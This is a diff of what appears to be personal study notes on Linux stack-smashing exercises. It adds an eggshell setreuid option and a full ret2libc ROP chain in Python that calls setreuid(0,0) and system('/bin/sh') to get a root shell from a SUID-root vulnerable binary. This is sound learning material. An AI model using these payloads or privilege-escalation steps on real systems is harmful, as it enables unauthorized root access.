@@ -109,6 +109,10 @@ Again, providing no offset, the address in `BOF` does not point to the `EGG` env
 Just like with `exploit4`, it is easy to find a fitting offset with a debugger by looking at the difference of the provided (incorrect) address and the address of the `EGG` variable (e.g. by issuing `search "EGG"` in `gdb` with the `pwndbg` plugin).
 Thus, calling e.g. `eggshell -b 600 -o -2000` lets us spawn a shell from the `vulnerable` executable.
 
+Additionally, appending the `-s` flag to the `eggshell` call uses a different shellcode which not only spawns a shell but also calls `setreuid(geteuid(), geteuid())` before.
+With this addition, it is not only possible to spawn a shell at all, but also to spawn a shell with the executable's owner's privileges if the SUID bit on the executable is set.
+If the owner is set to `root` and the SUID bit is set (e.g. by executing `sudo chown root vulnerable && sudo chmod u+s vulnerable`), it is thus possible to spawn a root shell even when executing the exploit as a non-privileged user.
+
 
 # 64-bit Linux stack smashing
 
@@ -116,7 +120,7 @@ This tutorial found on <https://blog.techorganic.com> is about exploiting stack 
 
 ## Part 1
 
-In the first part, a classical stack buffer overflow is conducted with all the protection mechanisms turned off (NX bit, canaries, ASLR).
+In the [first part](https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/), a classical stack buffer overflow is conducted with all the protection mechanisms turned off (NX bit, canaries, ASLR).
 The attack is conducted by writing the shellcode to an environment variable, calculating the address of the environment variable on the stack and overwriting the return address of the function `vuln()` from [vulnerable.c](./64bit%20Stack%20smashing%20-%20superkojiman/vulnerable.c).
 
 This is a pretty simple exploit, it does not even use tricks like NOP sleds in front of the shellcode.
@@ -124,7 +128,7 @@ The whole exploit can be conducted by executing the [pwn_vulnerable.sh](./64bit%
 
 ## Part 2
 
-In the second part, the stack is not used for executing shellcode (i.e. by placing the shellcode directly on the stack via the input or by placing it on the stack via environment variables.)
+In the [second part](https://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/), the stack is not used for executing shellcode (i.e. by placing the shellcode directly on the stack via the input or by placing it on the stack via environment variables.)
 Instead, a `ret2libc` attack is conducted.  
 In this attack, the return address is overwritten such that the program jumps to libc and executes arbitrary code from there.
 As libc is included as a shared library, the code in there has to be executable.
@@ -141,7 +145,7 @@ The code is then the following (`cat` is necessary for keeping the shell open):
 (python -c "from struct import pack; print(
     'A' * 104 +                         # Padding to reach the return address
     pack('<Q', 0x0000555555555273) +    # Address of pop rdi; ret in function __libc_csu_init
-    pack('<Q', 0x000055555555603f) +    # Address of \"/bin/sh\" in function main
+    pack('<Q', 0x000055555555603f) +    # Address of "/bin/sh" in function main
     pack('<Q', 0x00007ffff7e1a4e0)      # Address of function system
     )"; cat) | ./vulnerable
 ```
@@ -162,10 +166,28 @@ Thus, a fixed version of the code is as follows:
     'A' * 104 +                         # Padding to reach the return address
     pack('<Q', 0x00005555555551da) +    # Address of ret in function vuln
     pack('<Q', 0x0000555555555273) +    # Address of pop rdi; ret in function __libc_csu_init
-    pack('<Q', 0x000055555555603f) +    # Address of \"/bin/sh\" in function main
+    pack('<Q', 0x000055555555603f) +    # Address of "/bin/sh" in function main
     pack('<Q', 0x00007ffff7e1a4e0)      # Address of function system
     )"; cat) | ./vulnerable
 ```
+
+If the SUID bit is set on the executable and it is owned by root, we can spawn a root shell with the following code:
+```bash
+(python -c "from struct import pack; print(
+    'A' * 104 +                         # Padding to reach the return address
+    pack('<Q', 0x00005555555551da) +    # Address of ret in function vuln
+    pack('<Q', 0x0000555555555273) +    # Address of pop rdi; ret in function __libc_csu_init
+    pack('<Q', 0x0000000000000000) +    # Value 0 => uid of root
+    pack('<Q', 0x0000555555555271) +    # Address of pop rsi; pop r15; ret in function __libc_csu_init
+    pack('<Q', 0x0000000000000000) +    # Value 0 => uid of root (into rsi)
+    pack('<Q', 0x4141411411414141) +    # Junk (into r15)
+    pack('<Q', 0x00007ffff7edcc20) +    # Address of function setreuid
+    pack('<Q', 0x0000555555555273) +    # Address of pop rdi; ret in function __libc_csu_init
+    pack('<Q', 0x000055555555603f) +    # Address of "/bin/sh" in function main
+    pack('<Q', 0x00007ffff7e1a4e0)      # Address of function system
+    )"; cat) | ./vulnerable
+```
+This code additionally calls `setreuid(0, 0)` before spawning the shell.
 
 Note: when working through this exercise, I noticed that I could not just get the addresses from the executable but had to get the addresses from gdb.
 This is because the executable by default is compiled as PIE (Position Independent Executable).
